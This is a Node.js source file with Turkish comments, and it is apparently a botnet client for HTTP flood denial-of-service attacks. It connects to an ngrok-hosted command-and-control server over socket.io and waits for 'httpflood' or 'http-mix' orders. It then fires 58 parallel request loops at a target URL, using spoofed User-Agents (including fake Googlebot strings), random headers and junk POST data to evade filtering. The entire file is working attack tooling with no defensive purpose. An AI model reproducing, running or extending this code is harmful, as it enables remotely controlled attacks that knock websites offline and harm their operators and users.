const io = require('socket.io-client');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const crypto = require('crypto');

// WebSocket bağlantısı
const socket = io('https://22e1-51-178-142-158.ngrok-free.app');

let isFlooding = false;
let floodingTimeout;

// WebSocket bağlantısında başarılı olunduğunda mesaj yazdırıyoruz
socket.on('connect', () => {
  console.log('Server\'a bağlanıldı!');
});

// WebSocket'ten gelen yeni mesajları dinliyoruz
socket.on('new_message', (data) => {
  console.log('Yeni mesaj:', data);

  if (data && data.method === 'httpflood') {
    console.log('HTTP Flood saldırısı başlatılıyor...');
    startFlooding(data.url, data.port, data.duration, 'httpflood');
  } else if (data && data.method === 'http-mix') {
    console.log('HTTP Mix saldırısı başlatılıyor...');
    startFlooding(data.url, data.port, data.duration, 'http-mix');
  } else if (data && data.method === 'stopAttack') {
    console.log('Saldırı durduruluyor...');
    stopFlooding();
  } else {
    console.log('Bilinmeyen bir method alındı veya veri geçersiz.');
  }
});

// Rastgele User-Agent oluşturucu
function generateUserAgent() {
  const platforms = ['Macintosh', 'Windows', 'X11'];
  const macSystems = ['68K', 'PPC', 'Intel Mac OS X'];
  const windowsSystems = [
    'Win3.11',
    'WinNT3.51',
    'WinNT4.0',
    'Windows NT 5.0',
    'Windows NT 5.1',
    'Windows NT 5.2',
    'Windows NT 6.0',
    'Windows NT 6.1',
    'Windows NT 6.2',
    'Win 9x 4.90',
    'Windows XP',
    'Windows 7',
    'Windows 8',
    'Windows NT 10.0; Win64; x64'
  ];
  const linuxSystems = ['Linux i686', 'Linux x86_64'];
  const browsers = ['chrome', 'spider', 'ie'];
  const browserTokens = ['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64'];
  const spiders = [
    'AdsBot-Google (http://www.google.com/adsbot.html)',
    'Baiduspider (http://www.baidu.com/search/spider.htm)',
    'FeedFetcher-Google (http://www.google.com/feedfetcher.html)',
    'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
    'Googlebot-Image/1.0',
    'Googlebot-News',
    'Googlebot-Video/1.0'
  ];

  const platform = platforms[Math.floor(Math.random() * platforms.length)];
  let os = '';
  if (platform === 'Macintosh') {
    os = macSystems[Math.floor(Math.random() * macSystems.length)];
  } else if (platform === 'Windows') {
    os = windowsSystems[Math.floor(Math.random() * windowsSystems.length)];
  } else if (platform === 'X11') {
    os = linuxSystems[Math.floor(Math.random() * linuxSystems.length)];
  }

  const browser = browsers[Math.floor(Math.random() * browsers.length)];
  if (browser === 'chrome') {
    const webkit = Math.floor(Math.random() * (599 - 500) + 500);
    const version = `${Math.floor(Math.random() * 100)}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 1000)}`;
    return `Mozilla/5.0 (${os}) AppleWebKit/${webkit}.0 (KHTML, like Gecko) Chrome/${version} Safari/${webkit}`;
  } else if (browser === 'ie') {
    const version = `${Math.floor(Math.random() * 100)}.0`;
    const engine = `${Math.floor(Math.random() * 100)}.0`;
    const token = Math.random() > 0.5 ? `${browserTokens[Math.floor(Math.random() * browserTokens.length)]}; ` : '';
    return `Mozilla/5.0 (compatible; MSIE ${version}; ${os}; ${token}Trident/${engine})`;
  } else {
    return spiders[Math.floor(Math.random() * spiders.length)];
  }
}

// Rastgele başlıklar oluşturucu
function generateRandomHeaders() {
  return {
    'Accept': [
      'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
      'text/plain;q=0.8,image/png,*/*;q=0.5'
    ][Math.floor(Math.random() * 3)],
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': ['gzip, deflate', 'gzip'][Math.floor(Math.random() * 2)],
    'User-Agent': generateUserAgent(),
    'X-Custom-Header': crypto.randomBytes(6).toString('hex')
  };
}

// Rastgele POST verisi oluşturma fonksiyonu
function generateRandomData() {
  return JSON.stringify({
    username: crypto.randomBytes(8).toString('hex'),
    email: crypto.randomBytes(12).toString('hex') + '@example.com',
    message: crypto.randomBytes(16).toString('hex')
  });
}

// HTTP Flood ve HTTP Mix saldırısını başlatma fonksiyonu
function startFlooding(targetUrl, port, duration, method) {
  const url = new URL(targetUrl);
  const protocol = url.protocol === 'https:' ? https : http;
  const threadCount = 58;
  const endTime = Date.now() + duration;

  if (isFlooding) {
    console.log('Zaten saldırı yapılıyor.');
    return;
  }

  isFlooding = true;
  console.log(`${method.toUpperCase()} saldırısı başlatıldı. ${duration} ms boyunca hedef: ${targetUrl}`);

  floodingTimeout = setTimeout(() => {
    stopFlooding();
  }, duration);

  for (let i = 0; i < threadCount; i++) {
    (function flood() {
      if (!isFlooding) {
        return;
      }

      if (method === 'httpflood') {
        sendRequest(targetUrl, protocol, port, 'POST');
      } else if (method === 'http-mix') {
        const randomMethod = ['GET', 'POST', 'PUT', 'DELETE'][Math.floor(Math.random() * 4)];
        sendRequest(targetUrl, protocol, port, randomMethod);
      }
      setTimeout(flood, 1);
    })();
  }
}

// İstek gönderme fonksiyonu
function sendRequest(targetUrl, protocol, port, method) {
  const postData = (method === 'POST' || method === 'PUT') ? generateRandomData() : null;
  const headers = generateRandomHeaders();
  const url = new URL(targetUrl);
  const options = {
    hostname: url.hostname,
    port: port || (protocol === 'https:' ? 443 : 80),
    path: url.pathname + ((method === 'GET' || method === 'DELETE') ? `?id=${Math.floor(Math.random() * 1000)}` : ''),
    method,
    headers: {
      ...headers,
      ...(postData ? { 'Content-Length': Buffer.byteLength(postData) } : {})
    }
  };

  const req = protocol.request(options, (res) => {
    res.on('data', () => {});
  });

  req.on('error', (error) => {
    console.error('Hata:', error.message);
  });

  if (postData) {
    req.write(postData);
  }
  req.end();
}

// Flood saldırısını durdurma fonksiyonu
function stopFlooding() {
  isFlooding = false;
  clearTimeout(floodingTimeout);
  console.log('Saldırı durduruldu.');
}
